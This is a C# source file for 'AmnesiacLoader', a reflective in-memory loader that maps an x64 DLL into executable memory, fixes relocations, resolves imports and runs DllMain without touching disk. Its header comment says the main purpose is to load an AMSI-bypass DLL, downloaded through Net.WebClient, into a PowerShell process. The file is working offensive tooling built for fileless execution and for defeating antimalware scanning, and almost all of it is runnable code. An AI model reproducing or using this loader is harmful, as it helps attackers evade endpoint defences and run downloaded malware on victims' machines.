// NativeLoader — reflective in-memory native DLL loading.
// Maps a raw PE (x64) into executable memory, fixes relocations,
// resolves imports, then calls DllMain with DLL_PROCESS_ATTACH.
// No disk write — the DLL never touches the filesystem.
//
// Primary use: load amsi_bypass.dll (PAGE_GUARD VEH bypass) into the
// current PS process from a byte array downloaded via Net.WebClient.

using System;
using System.Runtime.InteropServices;

namespace AmnesiacLoader
{
    public static class NativeLoader
    {
        // ── Win32 ─────────────────────────────────────────────────────────────────
        [DllImport("kernel32", SetLastError = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize,
                                           uint flAllocationType, uint flProtect);

        [DllImport("kernel32")]
        static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                           uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "LoadLibraryA")]
        static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress")]
        static extern IntPtr GetProcAddressByName(IntPtr hModule, string name);

        [DllImport("kernel32", EntryPoint = "GetProcAddress")]
        static extern IntPtr GetProcAddressByOrdinal(IntPtr hModule, IntPtr ordinal);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate bool DllEntryPoint(IntPtr hinstDll, uint reason, IntPtr reserved);

        const uint MEM_COMMIT_RESERVE = 0x3000;
        const uint PAGE_EXECUTE_RW    = 0x40;
        const uint DLL_PROCESS_ATTACH = 1;
        const int  REL_BASED_DIR64    = 10;

        // ── Public entry point ────────────────────────────────────────────────────

        /// <summary>
        /// Reflectively loads a native x64 DLL from raw PE bytes into the current
        /// process without writing to disk. Calls DllMain on success.
        /// Returns the base address of the mapped image.
        /// </summary>
        public static IntPtr Load(byte[] raw)
        {
            if (raw == null || raw.Length < 64)
                throw new ArgumentException("Invalid PE bytes");

            // IMAGE_DOS_HEADER.e_lfanew
            int lfanew = BitConverter.ToInt32(raw, 0x3C);
            if (BitConverter.ToUInt32(raw, lfanew) != 0x4550)
                throw new Exception("Not a PE signature");

            // IMAGE_FILE_HEADER at e_lfanew+4
            int    fhOff    = lfanew + 4;
            ushort numSec   = BitConverter.ToUInt16(raw, fhOff + 2);
            ushort optSz    = BitConverter.ToUInt16(raw, fhOff + 16);

            // IMAGE_OPTIONAL_HEADER64 at fhOff+20
            int    ohOff    = fhOff + 20;
            if (BitConverter.ToUInt16(raw, ohOff) != 0x20B)
                throw new Exception("Not PE32+ — only x64 supported");

            uint  epRva    = BitConverter.ToUInt32(raw, ohOff + 16);
            long  prefBase = BitConverter.ToInt64(raw, ohOff + 24);
            uint  imgSz    = BitConverter.ToUInt32(raw, ohOff + 56);
            uint  hdrSz    = BitConverter.ToUInt32(raw, ohOff + 60);
            int   ddOff    = ohOff + 112;   // DataDirectory array starts here

            // ── Allocate RWX region sized to SizeOfImage ──────────────────────────
            IntPtr pImg = VirtualAlloc(IntPtr.Zero, new UIntPtr(imgSz),
                                        MEM_COMMIT_RESERVE, PAGE_EXECUTE_RW);
            if (pImg == IntPtr.Zero)
                throw new OutOfMemoryException("VirtualAlloc failed: " + Marshal.GetLastWin32Error());

            // ── Copy PE headers ───────────────────────────────────────────────────
            Marshal.Copy(raw, 0, pImg, (int)hdrSz);

            // ── Copy sections (raw file → virtual addresses) ──────────────────────
            // IMAGE_SECTION_HEADER layout (40 bytes each):
            //   +0  Name[8]
            //   +8  VirtualSize
            //   +12 VirtualAddress
            //   +16 SizeOfRawData
            //   +20 PointerToRawData
            int secBase = ohOff + optSz;
            for (int i = 0; i < numSec; i++)
            {
                int  sh     = secBase + i * 40;
                uint vaRva  = BitConverter.ToUInt32(raw, sh + 12);
                uint rawSz  = BitConverter.ToUInt32(raw, sh + 16);
                uint rawPt  = BitConverter.ToUInt32(raw, sh + 20);

                if (rawSz > 0 && rawPt + rawSz <= (uint)raw.Length)
                    Marshal.Copy(raw, (int)rawPt,
                                 new IntPtr(pImg.ToInt64() + vaRva), (int)rawSz);
            }

            // ── Base relocations (if load address differs from preferred) ──────────
            // DataDirectory[5] = Base Relocation Table
            long delta = pImg.ToInt64() - prefBase;
            if (delta != 0)
            {
                uint relRva = BitConverter.ToUInt32(raw, ddOff + 5 * 8);
                uint relSz  = BitConverter.ToUInt32(raw, ddOff + 5 * 8 + 4);
                if (relRva != 0 && relSz > 0)
                    ApplyRelocations(pImg, relRva, relSz, delta);
            }

            // ── Import resolution ─────────────────────────────────────────────────
            // DataDirectory[1] = Import Table
            uint impRva = BitConverter.ToUInt32(raw, ddOff + 1 * 8);
            if (impRva != 0)
                ResolveImports(pImg, impRva);

            // ── DllMain ───────────────────────────────────────────────────────────
            if (epRva != 0)
            {
                IntPtr ep = new IntPtr(pImg.ToInt64() + epRva);
                var dllMain = (DllEntryPoint)Marshal.GetDelegateForFunctionPointer(
                                  ep, typeof(DllEntryPoint));
                dllMain(pImg, DLL_PROCESS_ATTACH, IntPtr.Zero);
            }

            return pImg;
        }

        // ── Base relocation processing ────────────────────────────────────────────
        // Each BASERELOC block: [pageRva:4][blockSize:4][entries:2 each]
        // Entry high 4 bits = type (10 = DIR64), low 12 bits = offset within page
        static void ApplyRelocations(IntPtr pImg, uint relRva, uint relSz, long delta)
        {
            long imgBase = pImg.ToInt64();
            long offset  = 0;

            while (offset < relSz)
            {
                IntPtr blk     = new IntPtr(imgBase + relRva + offset);
                uint   pageRva = (uint)Marshal.ReadInt32(blk, 0);
                uint   blkSz   = (uint)Marshal.ReadInt32(blk, 4);
                if (blkSz == 0) break;

                int count = (int)(blkSz - 8) / 2;
                for (int i = 0; i < count; i++)
                {
                    ushort entry = (ushort)Marshal.ReadInt16(blk, 8 + i * 2);
                    if ((entry >> 12) == REL_BASED_DIR64)
                    {
                        IntPtr slot = new IntPtr(imgBase + pageRva + (entry & 0xFFF));
                        Marshal.WriteInt64(slot, Marshal.ReadInt64(slot) + delta);
                    }
                }
                offset += blkSz;
            }
        }

        // ── Import table resolution ───────────────────────────────────────────────
        // IMAGE_IMPORT_DESCRIPTOR (20 bytes, null-terminated array):
        //   +0  OriginalFirstThunk (ILT RVA)
        //   +4  TimeDateStamp
        //   +8  ForwarderChain
        //   +12 Name (RVA to ASCII DLL name)
        //   +16 FirstThunk (IAT RVA)
        static void ResolveImports(IntPtr pImg, uint impRva)
        {
            long imgBase = pImg.ToInt64();
            int  descOff = 0;

            while (true)
            {
                IntPtr desc    = new IntPtr(imgBase + impRva + descOff);
                uint   iltRva  = (uint)Marshal.ReadInt32(desc, 0);
                uint   nameRva = (uint)Marshal.ReadInt32(desc, 12);
                uint   iatRva  = (uint)Marshal.ReadInt32(desc, 16);
                if (nameRva == 0) break;

                string dllName = Marshal.PtrToStringAnsi(new IntPtr(imgBase + nameRva));
                IntPtr hDll    = LoadLibrary(dllName);

                // Walk ILT (OriginalFirstThunk) to get import names; patch IAT (FirstThunk)
                long iltPtr = imgBase + (iltRva != 0 ? iltRva : iatRva);
                long iatPtr = imgBase + iatRva;

                while (true)
                {
                    long thunk = Marshal.ReadInt64(new IntPtr(iltPtr));
                    if (thunk == 0) break;

                    IntPtr fn;
                    if ((thunk & unchecked((long)0x8000000000000000L)) != 0)
                    {
                        // Import by ordinal — low 16 bits are the ordinal
                        fn = hDll != IntPtr.Zero
                               ? GetProcAddressByOrdinal(hDll, new IntPtr(thunk & 0xFFFF))
                               : IntPtr.Zero;
                    }
                    else
                    {
                        // Import by name — thunk is RVA to IMAGE_IMPORT_BY_NAME
                        // structure: 2-byte hint (ignored) + null-terminated ASCII name
                        string fnName = Marshal.PtrToStringAnsi(new IntPtr(imgBase + thunk + 2));
                        fn = hDll != IntPtr.Zero
                               ? GetProcAddressByName(hDll, fnName)
                               : IntPtr.Zero;
                    }

                    if (fn != IntPtr.Zero)
                        Marshal.WriteInt64(new IntPtr(iatPtr), fn.ToInt64());

                    iltPtr += 8;
                    iatPtr += 8;
                }

                descOff += 20;
            }
        }
    }
}
